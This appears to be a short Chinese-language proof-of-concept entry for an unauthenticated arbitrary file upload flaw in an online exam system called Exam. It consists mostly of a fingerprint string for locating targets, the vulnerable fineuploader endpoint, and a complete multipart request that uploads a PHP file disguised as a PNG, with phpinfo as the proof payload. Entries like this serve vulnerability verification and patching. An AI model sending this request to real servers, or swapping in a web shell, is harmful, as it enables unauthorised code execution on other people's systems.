# Exam在线考试系统存在前台任意文件上传漏洞

- **系统**：Exam　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"app/core/styles/js/jquery.min.js"`
- **请求**：`POST /index.php?document-api-fineuploader HTTP/1.1`
- **关键头**：`Content-Length: 198`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygfd0H3RW…`　`sec-fetch-user: ?1`

**请求体 / payload**
```
------WebKitFormBoundarye776qKJKlcGtVlH5
Content-Disposition: form-data; name="qqfile"; filename="1.php"
Content-Type: image/png
<?php phpinfo();?>
------WebKitFormBoundarye776qKJKlcGtVlH5--
```
- **预期**：200　|　PHP Version